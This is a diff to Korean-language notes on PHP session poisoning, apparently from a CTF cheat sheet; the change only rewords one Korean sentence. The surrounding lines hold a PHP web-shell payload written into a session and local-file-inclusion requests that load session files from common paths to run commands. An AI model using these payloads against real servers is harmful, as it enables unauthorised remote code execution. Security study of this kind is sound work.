@@ -6,7 +6,7 @@ Session Poisoning
 `?p=broken|data;<?php system($_GET['cmd']); ?>`
 
 LFI와 연계
-이때, 세션 위치는 아래와 같은 확률이 높음
+이때, 세션 위치는 아래와 같은 위치에 있을 확률이 높음
 `?p=/var/lib/php/sessions/sess_687b635d46cfd929e6384b922cf50e4b&cmd=./readflag`
 `?p=/tmp/sess_687b635d46cfd929e6384b922cf50e4b&cmd=./readflag`
 `?p=/var/tmp/sess_687b635d46cfd929e6384b922cf50e4b&cmd=./readflag`
